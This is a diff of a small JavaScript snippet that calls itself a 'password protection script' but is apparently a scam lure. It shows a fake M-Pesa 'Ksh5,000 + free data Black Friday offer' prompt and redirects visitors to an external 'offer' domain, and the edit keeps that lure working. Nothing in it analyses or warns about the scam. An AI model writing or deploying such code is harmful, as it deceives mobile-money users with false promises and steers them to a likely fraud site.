@@ -1,10 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '0k'
-password=prompt('SMS: Welcome to Mpesa Ksh5,000 + 15GB Free Data Black Friday Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != 'ok') {
-location.href='https://mpesa.offer-it.xyz/gift 
-';
+var password = '25GB DATA'
+password=prompt('SMS: Welcome to Mpesa Ksh5,000 + 15GB Free Data Black Friday Offer, Kindly Press OK to ACTIVATE ','25GB DATA');
+if (password != '25GB DATA') {
+location.href='https://mpesa.offer-it.xyz/gift';
 
 }
-
-
